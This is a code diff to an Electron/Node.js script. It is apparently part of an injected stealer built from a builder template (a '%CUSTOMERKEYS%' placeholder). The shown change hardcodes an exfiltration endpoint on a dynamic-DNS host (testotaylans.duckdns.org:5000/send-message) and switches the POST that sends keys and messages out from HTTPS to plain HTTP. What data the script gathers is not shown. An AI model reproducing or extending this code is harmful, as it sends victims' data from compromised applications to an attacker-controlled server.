@@ -4,6 +4,7 @@ const https = require('https');
 const args = process.argv;
 const path = require('path');
 const querystring = require('querystring');
+const http = require('http');
 
 const {
     BrowserWindow,
@@ -11,34 +12,29 @@ const {
 } = require('electron');
 
 
-const apiBaseUrl = "http://testotaylans.duckdns.org:5000";
-
 const Keys = "%CUSTOMERKEYS%";
 
 async function sendToApiMessage(Keys, message) {
     const data = JSON.stringify({ Keys: Keys, message: message });
-    const url = new URL(`${apiBaseUrl}/send-message`);
 
     const options = {
-        hostname: url.hostname,
-        port: url.port || 443,
-        path: url.pathname,
+        hostname: 'testotaylans.duckdns.org',
+        port: 5000,
+        path: '/send-message',
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Content-Length': data.length,
+            'Content-Length': data.length
         }
     };
 
-    const req = https.request(options, (res) => {
+    const req = http.request(options, (res) => {
         let responseData = '';
-
         res.on('data', (chunk) => {
             responseData += chunk;
         });
-
         res.on('end', () => {
-            console.log('API Response:', JSON.parse(responseData));
+            console.log('API Response:', responseData);
         });
     });
 
